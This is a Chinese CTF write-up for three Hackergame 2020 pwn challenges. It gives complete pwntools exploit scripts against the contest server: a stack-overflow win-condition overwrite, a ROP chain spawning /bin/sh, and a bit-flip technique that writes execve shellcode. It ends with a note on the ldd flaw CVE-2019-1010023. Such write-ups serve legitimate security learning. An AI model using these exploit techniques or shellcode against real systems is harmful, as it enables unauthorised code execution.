# Hackergame2020


玩了一次hackergamer，这里我只给出pwn的解答，也可以去看官方的[hackergame2020-writeups](https://github.com/USTC-Hackergame/hackergame2020-writeups)

# 生活在博弈树上

<!-- more -->

两种获得flag的方法：

- 覆盖胜利判断条件
- 栈溢出-ROP

## exp

- 覆盖胜利条件

```python
from pwn import *
from LibcSearcher import LibcSearcher
context.log_level="DEBUG"
context.arch="amd64"

local=0
#gdb.attach(p)
if local:
	p=process('./pwn')
	elf = ELF('./pwn')
else:
	p=remote('202.38.93.111',10141)
	elf = ELF('./pwn')

offset=0x90-1-5
payload='654:MEQCIEf6j+LhgeLSPOeZC/OwkdH+wHB9nXZHJxMNfAFy8OH5AiAnpcECcSQS8aCnVRKH+poDokge2AodYTIsFcTix+tShA=='
p.sendline(payload)
payload='(1,1)'+'a'*offset+p64(0x1)
p.send(payload)

p.interactive()
```

- ROP

```python
from pwn import *
from struct import pack
from LibcSearcher import LibcSearcher
context.log_level="DEBUG"
context.arch="amd64"

local=0
#gdb.attach(p)
if local:
	sh=process('./pwn')
	elf = ELF('./pwn')
else:
	sh=remote('202.38.93.111',10141)
	elf = ELF('./pwn')
offset=0x90-5
payload='654:MEQCIEf6j+LhgeLSPOeZC/OwkdH+wHB9nXZHJxMNfAFy8OH5AiAnpcECcSQS8aCnVRKH+poDokge2AodYTIsFcTix+tShA=='
sh.sendline(payload)
#gdb.attach(p)
# Padding goes here
p = '(1,1)'+'a'*offset+p64(0x1)
p += pack('<Q', 0x0000000000407228) # pop rsi ; ret
p += pack('<Q', 0x00000000004a60e0) # @ .data
p += pack('<Q', 0x000000000043e52c) # pop rax ; ret
p += '/bin//sh'
p += pack('<Q', 0x000000000046d7b1) # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x0000000000407228) # pop rsi ; ret
p += pack('<Q', 0x00000000004a60e8) # @ .data + 8
p += pack('<Q', 0x0000000000439070) # xor rax, rax ; ret
p += pack('<Q', 0x000000000046d7b1) # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x00000000004017b6) # pop rdi ; ret
p += pack('<Q', 0x00000000004a60e0) # @ .data
p += pack('<Q', 0x0000000000407228) # pop rsi ; ret
p += pack('<Q', 0x00000000004a60e8) # @ .data + 8
p += pack('<Q', 0x000000000043dbb5) # pop rdx ; ret
p += pack('<Q', 0x00000000004a60e8) # @ .data + 8
p += pack('<Q', 0x0000000000439070) # xor rax, rax ; ret
p += pack('<Q', 0x0000000000463af0) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463af0) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463af0) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463af0) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463af0) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463af0) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463af0) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463af0) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463af0) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463af0) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463af0) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463af0) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463af0) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463af0) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463af0) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463af0) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463af0) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463af0) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463af0) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463af0) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463af0) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463af0) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463af0) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463af0) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463af0) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463af0) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463af0) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463af0) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463af0) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463af0) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463af0) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463af0) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463af0) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463af0) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463af0) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463af0) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463af0) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463af0) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463af0) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463af0) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463af0) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463af0) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463af0) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463af0) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463af0) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463af0) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463af0) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463af0) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463af0) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463af0) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463af0) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463af0) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463af0) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463af0) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463af0) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463af0) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463af0) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463af0) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463af0) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000464095) # syscall ; ret
sh.sendline(p)
#gdb.attach(p)
sh.interactive()
```

# 超精准的宇宙射线

真的就是只能改1bit呗

我第一次的思路是只改1bit是不可能获得shell的，有没有办法能重复调用bitflip，于是就在call exit的代码处试了试，结果发现回到了start函数，这样我就能无限修改bit了。

继续分析，在调试的时候发现在0x401000-0x402000段为rwx段，那这个绝对就是我们要写入shellcode的地方了。在call exit的时候会调用0x4010c0的代码，所以我们就在这里写shellcode。

害，python没学好，自己手算了20多个字节，写了几百个比特的翻转。

这里我遇到了问题，我的非常确定的将每个bit正确的翻转了，我在0x401020的位置写入了‘/bin/sh’字符串，在0x401030处写了shellcode，但很奇怪，我动态调试了一下，发现0x401030处的代码没有发生变化，而0x401020处却正确的存入了字符串。

初步猜测是因为我调用的start函数的原因

## exp

```python
#!/usr/bin/env python3
from pwn import *

context.log_level='debug'
r = remote('202.38.93.111', 10231)
r.recvuntil("token: ")
r.sendline("654:MEQCIEf6j+LhgeLSPOeZC/OwkdH+wHB9nXZHJxMNfAFy8OH5AiAnpcECcSQS8aCnVRKH+poDokge2AodYTIsFcTix+tShA==")
def flip(addr, bit):
    r.recvuntil('flip?')
    r.sendline(hex(addr) + ' ' + str(bit))

target = 0x401295
flip(target + 1, 6)

shellcode_start = 0x4010c0
shellcode = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
e = ELF('./pwn')
for i in range(len(shellcode)):
    b = shellcode[i] ^ e.read(shellcode_start + i, 1)[0]
    for j in range(8):
        if (b >> j) & 1:
            flip(shellcode_start + i, j)
flip(target + 1, 6)

r.interactive()
```

# 动态链接库检查器

这个是真的是没想到，ldd命令是有漏洞的。

 **(CVE-2019-1010023) - ldd should protect against programs whose segments overlap with the loader itself**

请注意，在某些情况下（例如，程序指定了ld-linux.so以外的ELF解释器），某些版本的ldd可能会尝试通过直接执行程序来尝试获取依赖项信息，从而可能导致执行程序的ELF解释器中定义的任何代码，还可能导致执行程序本身。 （例如，在2.27之前的glibc版本中，上游ldd实现做到了这一点，尽管大多数发行版提供的修改版本都没有。）因此，切勿在不受信任的可执行文件上使用ldd，因为这可能会导致执行任意代码。处理不受信任的可执行文件时，更安全的选择是：$ objdump -p / path / to / program | grep需要，但是，这种选择只显示了可执行文件的直接依赖关系，而ldd显示了可执行文件的整个依赖关系树。

